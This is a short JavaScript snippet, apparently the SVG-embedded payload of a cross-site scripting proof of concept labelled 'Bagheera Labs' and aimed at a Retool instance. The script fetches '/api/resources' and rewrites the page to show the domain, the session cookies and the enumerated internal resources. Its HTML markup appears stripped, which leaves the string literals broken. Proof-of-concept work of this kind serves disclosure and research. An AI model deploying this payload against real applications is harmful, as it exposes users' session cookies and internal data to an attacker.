svg.script:
fetch('/api/resources')
      .then(function(r) { return r.json(); })
      .then(function(d) {
        document.body.innerHTML = '
'
          + '
XSS PoC - Bagheera Labs'
          + '
Domain: ' + document.domain + ''
          + '
Cookies: ' + document.cookie + ''
          + ''
          + '
Retool Resources Enumerated'
          + '' + JSON.stringify(d, null, 2) + ''
          + '';
      })
      .catch(function(e) {
        document.body.innerHTML = '
'
          + '
XSS PoC - Bagheera Labs'
          + '
Domain: ' + document.domain + ''
          + '
Cookies: ' + document.cookie + ''
          + ''
          + '
Resource fetch failed: ' + e + ''
          + '
XSS execution confirmed regardless.'
          + '';
      });
